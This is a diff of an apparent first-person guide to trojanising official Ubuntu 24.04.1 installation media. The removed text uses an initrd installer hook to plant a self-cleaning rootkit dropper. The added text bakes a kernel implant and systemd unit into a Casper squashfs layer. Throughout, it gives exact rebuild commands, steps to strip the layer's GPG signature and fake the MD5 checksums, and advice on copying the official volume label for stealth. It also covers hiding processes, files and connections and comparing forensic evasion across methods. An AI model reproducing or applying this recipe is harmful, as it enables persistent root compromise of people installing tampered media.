-## Replacing the Installer Initrd in the Extracted ISO
-
-```bash
-sudo cp ~/Kernel_Implant/new_initrd.gz ~/Kernel_Implant/iso_extract/install/initrd.gz
-```
-
-There is only one initrd to replace on Ubuntu Desktop. No text-vs-graphical split to worry about.
-
----
-
-## Rebuilding the ISO (UEFI-Aware)
+## Step 5: Rebuild the ISO (UEFI-Aware)
 
 The rebuild must reproduce the boot structure I captured in Step 1. A naive `mkisofs` rebuild loses the GPT structure and the appended EFI partition, and the resulting ISO will not boot on modern UEFI machines.
 
-The command below uses the arguments from the `-report_el_torito as_mkisofs` output, with the volume ID changed to make the custom image distinguishable:
+The command below uses the arguments from the `-report_el_torito as_mkisofs` output:
 
 ```bash
 ORIG_ISO="$(cd ~/Kernel_Implant && pwd)/ubuntu-24.04.1-desktop-amd64.iso"
-cd ~/Kernel_Implant/iso_extract
+cd ~/Kernel_Implant
 
 sudo xorriso -as mkisofs \
-  -V 'Ubuntu 24.04.1 LTS amd64' \
-  --modification-date='2024082716232600' \
-  --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:"$ORIG_ISO" \
-  --protective-msdos-label \
-  -partition_cyl_align off \
-  -partition_offset 16 \
-  --mbr-force-bootable \
-  -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::"$ORIG_ISO" \
-  -appended_part_as_gpt \
-  -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
-  -c '/boot.catalog' \
-  -b '/boot/grub/i386-pc/eltorito.img' \
-  -no-emul-boot \
-  -boot-load-size 4 \
-  -boot-info-table \
-  --grub2-boot-info \
-  -eltorito-alt-boot \
-  -e '--interval:appended_partition_2_start_3026280s_size_10144d:all::' \
-  -no-emul-boot \
-  -o ~/Kernel_Implant/custom-ubuntu-installer.iso .
+    -V 'Ubuntu 24.04.1 LTS amd64' \
+    --modification-date='2024082716232600' \
+    --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:"$ORIG_ISO" \
+    --protective-msdos-label \
+    -partition_cyl_align off \
+    -partition_offset 16 \
+    --mbr-force-bootable \
+    -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::"$ORIG_ISO" \
+    -appended_part_as_gpt \
+    -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
+    -c '/boot.catalog' \
+    -b '/boot/grub/i386-pc/eltorito.img' \
+    -no-emul-boot \
+    -boot-load-size 4 \
+    -boot-info-table \
+    --grub2-boot-info \
+    -eltorito-alt-boot \
+    -e '--interval:appended_partition_2_start_3026280s_size_10144d:all::' \
+    -no-emul-boot \
+    -o ~/Kernel_Implant/custom-ubuntu-implant.iso \
+    extracted/
 ```
 
 **Notes on the arguments:**
 
 - **`--grub2-mbr --interval:...:$ORIG_ISO`**: the GRUB2 MBR boot code is taken from the first 16 sectors of the original ISO file. I kept the original ISO path correct and did not point it at the new tree.
-- **`-append_partition 2 ... --interval:...:$ORIG_ISO`**: the EFI system partition is extracted from the original ISO's byte range and appended to the new ISO. The byte range `12383488d-12393647d` and the partition GUID `28732ac11ff8d211ba4b00a0c93ec93b` must match the original. If the original ISO's partition layout differs, these values will differ and must be taken from `original_torito.txt`.
-- **`-e '--interval:appended_partition_2_start_...:all::'`**: the El Torito EFI boot entry points to the newly appended partition, not to a file in the ISO filesystem.
-- **`-isohybrid-gpt-basdat`** produces the GPT structure that UEFI firmware expects when the ISO is written to USB.
+- **`-append_partition 2 ... --interval:...:$ORIG_ISO`**: the EFI system partition is extracted from the original ISO's byte range and appended to the new ISO. The byte range `12105120d-12115263d` and the partition GUID `28732ac11ff8d211ba4b00a0c93ec93b` must match the original. If the original ISO's partition layout differs (for example, on a different point release), these values will differ and must be taken from `original_torito.txt`.
+- **`-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'`**: the El Torito EFI boot entry points to the newly appended partition, not to a file in the ISO filesystem. The start and size values are taken from the original report.
+- **`-isohybrid-gpt-basdat`** was replaced with `-appended_part_as_gpt` on 24.04, because the EFI image is an appended partition rather than an embedded file. The `-report_el_torito as_mkisofs` output is authoritative here; do not hand-edit these flags.
+- **The volume label is copied from the original ISO**, making the modified image blend in with legitimate Ubuntu media. This is a deliberate stealth choice.
 
-The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output, not from Ubuntu 24.04.1's.
+**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the implant does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance—it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.
+
+The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output.
 
 ---
 
-## Verifying the Rebuilt ISO Boot Structure
+## Step 6: Verifying the Rebuilt ISO Boot Structure
 
 After the build, I repeated the inspection from Step 1 against the new ISO and compared it to the saved reference:
 
 ```bash
-xorriso -indev ~/Kernel_Implant/custom-ubuntu-installer.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/rebuilt_torito.txt 2>&1
+xorriso -indev ~/Kernel_Implant/custom-ubuntu-implant.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/rebuilt_torito.txt 2>&1
 diff -u ~/Kernel_Implant/original_torito.txt ~/Kernel_Implant/rebuilt_torito.txt
 ```
 
-The diff should show only the ISO filename changing in the `--interval` paths. The boot-relevant lines must be identical:
+The diff should show only the ISO filename changing in the `--interval` paths and possibly the appended-partition start sector (because the filesystem grew). The boot-relevant lines must be identical:
 
 ```
 --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'...'
--append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12383488d-12393647d::'...'
--e '--interval:appended_partition_2_start_3095872s_size_10160d:all::'
--no-emul-boot
--isohybrid-gpt-basdat
+-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'...'
+-c '/boot.catalog'
+-b '/boot/grub/i386-pc/eltorito.img'
+--grub2-boot-info
+-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'
 ```
 
 Had any of those been missing or changed, the rebuild would have been wrong, and I would not have proceeded to testing.
 
-> **Secure Boot note**: Modifying `initrd.gz` and adding a hook script does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward initrd injection should not break Secure Boot.
+> **Secure Boot note**: Modifying a squashfs layer and adding a systemd unit does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward root-filesystem injection should not break Secure Boot. However, unsigned kernel modules loaded by the implant will be rejected unless Secure Boot is disabled or the module is signed. Ubuntu 24.04's kernel module signing enforcement is stricter than older releases.
 
 ---
 
-## Verifying the Result on UEFI
+## Step 7: Testing the Implant ISO
 
-1. I booted the modified ISO in a UEFI VM, using QEMU with OVMF.
-2. The installer menu appeared, which proved the EFI boot entry was correct.
-3. I selected **Install Ubuntu**, the entry whose initrd I had patched.
-4. I proceeded through installation normally.
-5. During the final phase, the installer executed `80implant`. It copied the dropper and created the systemd unit inside `/target`.
-6. After installation, I booted the installed system in UEFI mode.
-7. I confirmed the service ran.
+I always test in a virtual machine before writing to physical media. For UEFI testing, I used OVMF:
 
-### What to expect once the dropper runs
+```bash
+qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
+    -bios /usr/share/ovmf/OVMF.fd
+```
 
-Because my payload is a self-cleaning dropper, the timeline is different from a plain implant. The dropper runs once at boot, installs the rootkit, waits for the rootkit to confirm success, and then deletes itself and its unit. After that, only the rootkit remains.
+I checked that:
 
-After the self-clean completes on a successful install:
+1. The system boots to the live desktop
+2. The implant is present at `/usr/local/bin/myimplant` (verify with `ls -la /usr/local/bin/myimplant`)
+3. The implant is running (verify with `ps aux | grep myimplant`)
+4. The unit is active (verify with `systemctl status myimplant.service`)
+5. If the implant hooks syscalls or loads a kernel module, kernel-level activity is visible:
+   ```bash
+   lsmod | grep myimplant
+   dmesg | tail -20
+   ```
 
-- `/usr/local/bin/implant` no longer exists.
-- `/etc/systemd/system/implant.service` no longer exists.
-- `/etc/systemd/system/multi-user.target.wants/implant.service` no longer exists.
-- `systemctl status implant.service` reports the unit as not found, unless the rootkit installed its own unit under a different name.
-- `journalctl -u implant.service` may still show historical entries from before the unit was removed. Whether those persist depends on the journal configuration and on what the rootkit chooses to do with the logs.
+Because `StandardOutput=null` and `StandardError=null` are set, `journalctl -u myimplant.service` will show the unit start and stop but no process output. That is expected. If I need to debug, I temporarily change those to `journal` in the extracted unit file, repack, and rebuild.
 
-After the rootkit loads:
+### Testing with a Virtual Disk (to Test Installation)
 
-- The rootkit's process is hidden.
-- The rootkit's files are hidden from `readdir`.
-- The rootkit's service or module is hidden from `systemctl` and `lsmod`.
-- The rootkit's network connections are filtered from `ss` and `netstat`.
+To test the full install flow, I added a virtual disk:
 
-If the self-clean does not run because the rootkit did not confirm success, the dropper and unit remain on disk. That is intentional. A failed install should be visible for debugging, and the artifacts make the failure obvious rather than silent.
+```bash
+qemu-img create -f qcow2 testdisk.qcow2 30G
+qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
+    -drive file=testdisk.qcow2,format=qcow2 \
+    -enable-kvm -cpu host \
+    -bios /usr/share/ovmf/OVMF.fd
+```
+
+With KVM enabled, the VM runs at near-native speed.
+
+### What to expect once the implant runs
+
+Because the implant is baked into the standard live layer, it runs on every boot of the modified media—Live session or installed system. Unlike a self-cleaning dropper, there is no first-stage artifact that removes itself. The implant is the persistent component, and it is responsible for hiding its own artifacts once loaded.
+
+After the implant loads:
+
+- The implant's process is hidden (if it hooks `getdents`/`read` on `/proc`).
+- The implant's files are hidden from `readdir`.
+- The implant's service or module is hidden from `systemctl` and `lsmod`.
+- The implant's network connections are filtered from `ss` and `netstat`.
+- The `myimplant.service` unit is hidden from `systemctl list-units` if the implant hooks the D-Bus interface or masks the unit directory entry. Hiding a systemd unit is harder than hiding a process; a competent implant either hooks `systemctl`'s underlying calls or accepts that the unit name is visible while the binary it points to is not.
 
 For a reliable confirmation of the end state, I inspected the target disk from outside the running system:
 
 ```bash
 # From a live environment or another machine, mount the target disk read-only
 sudo mount -o ro /dev/sdXN /mnt
-ls -l /mnt/usr/local/bin/implant
-cat /mnt/etc/systemd/system/implant.service
-ls -l /mnt/etc/systemd/system/multi-user.target.wants/implant.service
+ls -l /mnt/usr/local/bin/myimplant
+cat /mnt/etc/systemd/system/myimplant.service
+ls -l /mnt/etc/systemd/system/multi-user.target.wants/myimplant.service
 ```
 
-On a successful self-clean, all three commands report that the file or directory does not exist. On a failed self-clean, they show the dropper and unit still in place, which tells me the rootkit did not confirm success and I need to look at the dropper's own logs.
-
-This offline inspection cannot be fooled by a userland rootkit, because the rootkit is not running. It confirms the end state of the dropper. It does not confirm the rootkit loaded, which would require inspecting the rootkit's own artifacts separately.
+This offline inspection cannot be fooled by a userland rootkit, because the rootkit is not running. It confirms the presence of the implant binary and the systemd unit on disk.
 
 ### Debugging checklist
 
-**If the ISO failed to boot at all on UEFI**, the problem would have been in the ISO rebuild step, not the initrd injection. I would have re-run the torito diff described above. The most common failure on 24.04 is a mismatch in the `--interval` byte ranges or the `-append_partition` GUID.
+**If the ISO failed to boot at all on UEFI**, the problem would have been in the ISO rebuild step, not the filesystem injection. I would have re-run the torito diff described above. The most common failure on 24.04 is a mismatch in the `--interval` byte ranges or the `-append_partition` GUID. The `-report_el_torito as_mkisofs` output must be copied exactly.
 
-**If the installer failed to start**, the repacked initrd may have been malformed. I would have booted the ISO and watched for kernel or initrd errors. I would have extracted my repacked `new_initrd.gz` on the host and confirmed the file count matched the original plus two, and that `usr/lib/finish-install.d/80implant` and `implant` were present.
+**If the live system failed to start**, the repacked layer may have been malformed. I would have booted the ISO and watched for kernel or squashfs errors. I would have extracted my repacked `minimal.standard.live.squashfs` on the host and confirmed `usr/local/bin/myimplant` and `etc/systemd/system/myimplant.service` were present.
 
-**If the ISO booted and installed but the dropper was not deployed**, the hook did not run. I would have debugged by switching to VT4 (Alt+F4) during installation and checking the installer logs for `finish-install` errors. I would have switched to a shell (Alt+F2) and verified the hook was present in the running initrd:
+**If the layer verified against the original `.gpg` file and failed**, I would have removed the stale `.gpg` as described in Step 4, or re-signed the layer.
+
+**If the ISO booted but the implant was not running**, the unit did not start. I would have switched to a shell (Ctrl+Alt+F2) and checked:
 
 ```bash
-ls -l /usr/lib/finish-install.d/80implant
-ls -l /implant
+ls -l /etc/systemd/system/myimplant.service
+ls -l /etc/systemd/system/multi-user.target.wants/myimplant.service
+systemctl status myimplant.service
+systemctl cat myimplant.service
 ```
 
-If either was missing, the initrd was not replaced correctly. I would have re-extracted my repacked `new_initrd.gz` and confirmed `80implant` and `implant` were inside.
+If the `.wants` symlink was missing, the unit was never enabled. If `systemctl cat` showed the unit but `status` showed it failed, the `ExecStart` path was wrong or the binary was not executable. If `systemctl cat` found nothing, the unit file was not in the repacked layer.
 
-**If the dropper ran but the rootkit did not install**, the problem is in the dropper, not the deployment. I would have checked the rootkit's own install logs, the paths the dropper writes to, and whether the dropper has the correct privileges and dependencies inside the target.
+**If the implant ran but the kernel module did not load**, the problem is in the implant, not the deployment. I would have checked `dmesg` for module signature errors, verified the `.ko` file matched the target kernel version (24.04.1 uses the 6.8 kernel series), and confirmed Secure Boot status.
 
-**If the dropper ran and the rootkit installed but the self-clean did not happen**, the dropper's success signal from the rootkit did not fire. I would have checked the dropper's logs to see whether it reached the self-clean step, and whether the rootkit's confirmation mechanism returned success.
+**If the MD5 checksum errors appeared on boot**, I would have regenerated `md5sum.txt` as described in Step 4.
 
 ---
 
-## Ubuntu 24.04.1 Specific Differences from Kali
+## Why a Native systemd Unit Instead of rc.local
 
-This is **not** the same initrd layout as Kali. The differences that matter:
+`rc.local` is a legacy compatibility path. On modern Ubuntu it does not exist by default, and using it requires creating three artifacts and enabling a service that exists only to run a shell script. A native systemd unit is simpler, more idiomatic, and stealthier.
 
-| Aspect | Kali (my original write-up) | Ubuntu 24.04.1 |
+| Aspect | `rc.local` approach | Native systemd unit |
 |---|---|---|
-| Initrd path | `install.amd/gtk/initrd.gz` and `install.amd/initrd.gz` (two initrds) | `install/initrd.gz` (one initrd, used for both graphical and text) |
-| Boot loader | ISOLINUX (`-b /isolinux/isolinux.bin`) | GRUB2 (`--grub2-mbr`) |
-| EFI boot image | File at `/boot/grub/efi.img` | Appended partition (`-append_partition 2`) |
-| Initrd size | ~78 MB | ~130 MB |
-| Finish-install hooks | Same `usr/lib/finish-install.d/` directory | Same directory |
-| Preseed | `07preseed` runs `preseed/late_command` | `07preseed` runs `preseed/late_command` (autoinstall uses a different mechanism, but the initrd hook bypasses both) |
+| Files created | `/etc/rc.local`, `/etc/systemd/system/rc-local.service`, enable symlink | Unit file, enable symlink |
+| Execution path | systemd → `rc-local.service` → `/bin/bash` → `/etc/rc.local` → implant | systemd → `myimplant.service` → implant |
+| Extra processes | `bash` wrapper process | None |
+| Default presence | Does not exist on modern Ubuntu; creating it is itself an anomaly | Every service uses a unit file; one more is unremarkable |
+| Logging control | Redirect inside the shell script | `StandardOutput=` / `StandardError=` directives |
+| Failure visibility | `rc.local` exit code can fail the boot in confusing ways | Unit failure is contained and visible in `systemctl status` |
+| Stealth profile | Three artifacts, one of which (`rc.local`) is a known legacy path that analysts look for | Two artifacts, both in standard systemd locations |
 
-The **technique is identical**: extract the initrd, drop the dropper at `/implant`, write `80implant` into `usr/lib/finish-install.d/`, repack, replace, rebuild the ISO with the original boot arguments.
-
-What changes is the **paths and the ISO rebuild arguments**. The initrd injection mechanism itself is the same Debian-installer mechanism.
-
-**One important note on Ubuntu 24.04 autoinstall**: Ubuntu 24.04 uses **autoinstall** (cloud-init based) rather than classic preseed for unattended installs. The `07preseed` script is still present in the initrd for backwards compatibility, but the primary unattended mechanism is now `autoinstall` via `/cdrom/autoinstall.yaml` or a kernel cmdline `autoinstall ds=nocloud...`. The `finish-install.d` hook is **below** both mechanisms. It does not depend on preseed or autoinstall. It runs regardless of how the install was configured. That is another reason the initrd hook is more robust than either preseed or autoinstall for this purpose: it does not care which unattended mechanism, if any, was used.
+The native unit wins on every axis. The only reason to use `rc.local` is if the target system is old enough to lack systemd, which is not the case for Ubuntu 24.04 or any modern Ubuntu release.
 
 ---
 
-## Why I Targeted the Initrd Specifically
+## Kernel Implant Considerations for Ubuntu 24.04
 
-The Ubuntu Desktop ISO offers both a Live session and an installer. The Live session runs from `casper/filesystem.squashfs`; the installer runs from the initrd. These are two separate paths.
+When embedding a kernel implant into Ubuntu 24.04.1, I kept these additional factors in mind:
 
-By patching only `install/initrd.gz`, I covered the install path and nothing else. The Live session ("Try Ubuntu") does not execute `finish-install.d` hooks, so the dropper is not deployed there. The dropper only reaches the target after a completed install. That is a smaller exposure window than patching the live filesystem, which would run the implant on every Live boot.
-
-If I had wanted the implant to run in the Live session as well, I would have edited `casper/filesystem.squashfs` instead, as described in the comparison below. That is a different technique with a different exposure profile.
-
-The initrd hook is the right choice when the goal is "deploy to installed systems only, with the smallest media trace." The root filesystem edit is the right choice when the goal is "run on every boot of the media, including Live."
-
----
-
-## Comparing the Three Deployment Methods
-
-I evaluated three ways to get a dropper onto an Ubuntu install: autoinstall/preseed `late_command`, root filesystem editing, and the initrd `finish-install.d` hook documented here. They differ on where the logic lives, when it fires, and what an analyst can see.
-
-### Preseed / autoinstall `late_command`
-
-The logic is a plaintext block in the preseed file or autoinstall YAML. It runs at the end of installation. It is easy to deploy and easy to read. `grep late_command` on the ISO returns the entire playbook: source path, target path, service content, trigger condition. It is the least stealthy of the three at the media level.
-
-### Root filesystem editing (Live image)
-
-The logic and the dropper are baked into the root filesystem image (`casper/filesystem.squashfs`), which is what the Live environment mounts as `/`. SquashFS is just the container format Ubuntu happens to use for that image. The service fires on every boot of the modified ISO, not just on completed installs. There is no plaintext configuration file describing the payload, so an analyst has to diff the entire root filesystem image against a known-good build to find it. On the installed system, the footprint is the same three artifacts as the other methods before the self-clean: the dropper, the unit file, and the enable symlink. After the self-clean, the footprint is whatever the rootkit leaves.
-
-The trade-off is timing. The artifacts exist on the media before anyone installs, so every Live boot is an exposure window. If the dropper fails to run or the rootkit fails to load, the dropper is left plainly visible on the running system with no clean fallback beyond the self-clean gating.
-
-### Initrd `finish-install.d` hook
-
-The logic and the dropper are inside `install/initrd.gz`. It runs at the same moment as preseed `late_command`, at the end of installation, with `/target` mounted. It leaves no plaintext confession on the ISO. An analyst must extract the initrd and read every finish-install script to find it.
-
-The artifacts do not exist on the target until installation completes. If the install is aborted or the hook fails before the copy, the target system is clean. If the install completes and the dropper runs, the self-clean removes the first-stage artifacts on success. That is a failure mode the root filesystem editing method does not have.
-
-### Side-by-side comparison
-
-| Aspect | Preseed/autoinstall `late_command` | Root filesystem editing | Initrd hook |
-|---|---|---|---|
-| Where the logic lives | Plaintext preseed/YAML on the ISO | Inside the root filesystem image (`filesystem.squashfs`) | Inside `initrd.gz`, a compressed cpio archive |
-| Greppable from ISO | **Yes**, `grep late_command` finds it | No, requires a diff of the root filesystem image | No, requires initrd unpack and diff |
-| Diff against official ISO | Easy, the preseed file changed | Harder, the root filesystem image changed | Harder, the initrd changed |
-| Trigger timing | End of installation | Every boot of the modified ISO | End of installation |
-| Artifacts on target before install | None | Present on every Live boot | None |
-| Self-clean on success | Depends on the dropper | Depends on the dropper, but exposed on every Live boot | Depends on the dropper, and the artifacts only reach the target on a completed install |
-| Failure mode if dropper fails | Visible dropper on disk | Visible dropper on disk, exposed on every Live boot | Target stays clean if the copy failed, visible dropper if the install completed but the dropper failed |
-| Live mode support | No | Yes | No |
-| Forensic trace on media | Written confession | Hidden in the root filesystem image, needs diff | Hidden in the archive, needs unpack |
-
----
-
-## Forensic Perspective with a Self-Cleaning Rootkit Dropper Payload
-
-When the payload is a self-cleaning dropper rather than the rootkit itself, the trade-off between the methods changes in a specific way. The dropper is the visible first stage. The rootkit is the hidden second stage. The self-clean removes the first stage on success.
-
-Before the dropper runs, the techniques differ in traceability: preseed leaves a plaintext artifact, while root filesystem editing and the initrd hook both hide their logic inside compiled artifacts. After the dropper runs and the rootkit loads, that pre-execution difference largely disappears on the live system, because a competent rootkit can hide its own process, files, systemd unit, kernel module, and network connections.
-
-The self-clean changes the post-success picture. On a successful install, the dropper, its unit, and the enable symlink are gone. Offline disk analysis of the installed system shows only whatever the rootkit chose to leave. That is the strongest forensic position, and it is available with any of the three deployment methods, provided the dropper is built to self-clean.
-
-What the self-clean does not change is the media trace. The dropper binary is still in the ISO, and the hook or preseed that delivers it is still in the ISO. The self-clean removes the target-side artifacts, not the media-side artifacts. The deployment method still matters for what an analyst sees when they examine the ISO.
-
-| Forensic path | Preseed | Root filesystem editing | Initrd hook |
-|---|---|---|---|
-| Live exam of running system | Dropper visible briefly, rootkit hidden | Dropper visible briefly, rootkit hidden | Dropper visible briefly, rootkit hidden |
-| Offline disk analysis of installed system after successful self-clean | Only the rootkit's artifacts | Only the rootkit's artifacts | Only the rootkit's artifacts |
-| Offline disk analysis of installed system after failed self-clean | Dropper, unit file, symlink | Dropper, unit file, symlink | Dropper, unit file, symlink |
-| ISO integrity check against official hash | Fails, modified ISO | Fails, modified ISO | Fails, modified ISO |
-| ISO content inspection | `grep late_command` finds it instantly | Requires a full diff of the root filesystem image against known-good | Requires initrd unpack and diff |
-| Artifacts present before install | None | Present on every Live boot | None |
-| Failure mode if dropper does not run | Visible dropper left on disk | Visible dropper left on disk | Target stays clean if the copy failed |
-
-The self-clean raises the bar for all three methods on the target side. The remaining difference is concentrated in the media and in the exposure window. Root filesystem editing scatters the dropper onto every Live boot, which means the self-clean on a later install does not erase the fact that the dropper was present on the media and in every Live session. The initrd hook and preseed methods keep the dropper off the target until an install completes. Of those two, the initrd hook is stealthier because it leaves no plaintext confession on the ISO.
-
-The initrd hook wins against preseed because it runs at the same moment but leaves no plaintext confession on the ISO. It wins against root filesystem editing because it keeps the artifacts off the media until install, which matters more for a dropper than for a self-contained rootkit, since the dropper is the visible component and the self-clean only reaches the target-side artifacts. The initrd hook is the best of the three because it gets the dropper onto the target with the smallest media trace, and the self-clean then removes the target-side trace on success.
-
----
-
-## Why This Method Is Stealthier Than Preseed
-
-Look at what `07preseed` does. It is a 50-byte script that calls `preseed_command preseed/late_command`. That is the entire preseed mechanism. The difference between preseed and the initrd hook is not what runs at the end of installation. Both run from `finish-install.d` at the same moment. The difference is where the configuration lives.
-
-| Aspect | Preseed/autoinstall `late_command` | Initrd `80implant` hook |
-|---|---|---|
-| Where the logic lives | Plaintext preseed/YAML on the ISO | Inside `initrd.gz`, a compressed cpio archive |
-| Greppable from ISO | **Yes**. `grep late_command` finds it instantly | No. Requires unpacking the initrd |
-| Diff against official ISO | Easy, the preseed file changed | Harder, the initrd is a compressed archive that must be unpacked and diffed |
-| Forensic trace on ISO | Written confession | Hidden in the boot image |
-| Trigger timing | End of installation | End of installation, identical |
-| Failure mode if dropper fails | Visible dropper left on disk | Same, but the hook itself has no plaintext trail on the ISO |
-
-The initrd hook does exactly the same thing at exactly the same time, but the evidence is buried in a compressed cpio archive instead of a readable text file on the media.
-
----
-
-## Will It Run in Live Mode?
-
-**No, and that is expected.** The Ubuntu Desktop ISO's Live session ("Try Ubuntu") does not execute `finish-install.d` hooks. The hook only runs during the install phase, when `/target` is mounted. The dropper is deployed into the installed system, not into the Live runtime. If my goal had been to run when selecting "Try Ubuntu," I would have needed the root filesystem editing workflow against `casper/filesystem.squashfs` instead.
+| Consideration | Description |
+|---------------|-------------|
+| Kernel version matching | 24.04.1 uses the 6.8 kernel series. The `.ko` must match the exact kernel version inside the ISO. Check with `ls squashfs-root/lib/modules/` |
+| Module signing | 24.04 enforces module signature verification when Secure Boot is enabled. Unsigned modules will be rejected. Sign the module or disable Secure Boot |
+| Persistence | The systemd unit runs the implant on every boot. If the implant needs to survive installation to disk, it must also install itself into the target system |
+| Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure the implant hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |
 
 ---
 
 ## Project Cleanup
 
-When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the dropper binary, the reference torito reports, and the rebuilt ISO:
+When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the implant binary, the reference torito reports, and the rebuilt ISO:
 
 ```bash
 cd ~/Kernel_Implant
-sudo rm -rf iso_extract mount_dir initrd_extract new_initrd.gz
+sudo rm -rf isomount extracted squashfs-root
 ls -lh
-# saw: ubuntu-24.04.1-desktop-amd64.iso  implant  custom-ubuntu-installer.iso
+# saw: ubuntu-24.04.1-desktop-amd64.iso  myimplant  custom-ubuntu-implant.iso
 #       original_torito.txt  rebuilt_torito.txt
 ```
 
-I kept the extracted tree in case I wanted to iterate on the hook or swap the dropper. Re-extracting it takes only a minute.
+I kept the extracted tree in case I wanted to iterate on the unit or swap the implant. Re-extracting it takes only a few minutes.
+
+---
+
+## Summary
+
+| Stage | Command | Purpose |
+|-------|---------|---------|
+| Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
+| Identify Layer | `ls -lh extracted/casper/` | Pick `minimal.standard.live.squashfs` (or the minimal base) |
+| Extract Layer | `unsquashfs -d squashfs-root casper/minimal.standard.live.squashfs` | Access the live root filesystem layer |
+| Insert Implant | `cp myimplant squashfs-root/usr/local/bin/` | Bundle your implant |
+| Create Unit | Write `myimplant.service` | Native systemd auto-run |
+| Enable Unit | Symlink into `multi-user.target.wants/` | Start at boot |
+| Repack Layer | `mksquashfs squashfs-root minimal.standard.live.squashfs` | Compress modified layer |
+| Update Size | Write `.size` file | Keep installer layer-size metadata valid |
+| Drop Stale Sig | `rm minimal.standard.live.squashfs.gpg` | Avoid failed signature check on the modified layer |
+| Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
+| Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISO |
+
+That is it. No `rc.local`, no shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO, started by a native systemd unit indistinguishable in structure from any other service on the system.
 
 ---
 
 ## Conclusion
 
-By injecting a self-cleaning rootkit dropper and a `finish-install.d` hook into the installer's `initrd.gz`, the dropper is deployed into the target system at the end of installation, executes as root at boot, installs the rootkit that conceals the system afterward, and deletes itself on success so the first-stage artifacts do not remain. I targeted Ubuntu 24.04.1, but the method is not Ubuntu-specific: the hook mechanism comes from the Debian installer, which other distributions inherit, and the general approach applies to any installer that unpacks an initrd and runs scripts against a mounted target. The distribution-specific parts are the initrd path, the hook directory contents, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.
+By injecting a kernel implant binary and a native systemd unit into one of the live filesystem layers under `casper/`, the implant is deployed into the target system at boot, executes as root before most security tooling initializes, and runs on every boot of the modified media—Live session or installed system. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that holds the desktop files, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.
 
-I started with a verified download from the official Ubuntu releases page, so the base image was known-good before modification. I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the installer initrd means the injection fires on the install path real users actually take, and it keeps the forensic surface to a single modified artifact. Compared with preseed/autoinstall, the initrd hook runs at the same moment but leaves no plaintext confession on the ISO. Compared with root filesystem editing, it keeps the artifacts off the media until install and, combined with the self-clean, leaves only the rootkit's own trace on a successful target. The logic lives inside a compressed boot image, where it must be deliberately unpacked to be found.
+On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images: a minimal base (`minimal.squashfs`), a standard layer (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`), per-language variants, and secureboot variants. I chose the standard live layer because it is the one the Live session mounts for the desktop, and the installer writes it to the target disk. The other layers and the `casper/initrd` boot initramfs are untouched.
 
-On Ubuntu 24.04.1, the ISO uses GRUB2 for legacy BIOS boot and an appended EFI partition for UEFI boot, so the rebuild must use `xorriso` with the exact El Torito and isohybrid arguments reported by `-report_el_torito as_mkisofs`, including the `--grub2-mbr` source and the `-append_partition 2` byte range and GUID. A simple `mkisofs` command produces an ISO that fails to boot on UEFI. This work demonstrates how installation media can be weaponized at the deployment stage, before any endpoint security is in place, and why verifying the integrity of installation ISOs matters on modern, UEFI-booting machines as much as on legacy systems.
+I used a native systemd unit rather than `rc.local` because `rc.local` is a legacy compatibility shim that requires three artifacts and an extra shell process, while a native unit is one file plus one symlink in the standard systemd locations. The unit is structurally indistinguishable from any other service on the system, which is the stealth gain that `rc.local` cannot offer.
+
+I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting a Casper layer means the injection fires on both the Live session and the install path, and it keeps the forensic surface to a single modified artifact: the chosen squashfs layer. The logic lives inside a compressed filesystem image, where it must be deliberately unpacked and diffed to be found.
+
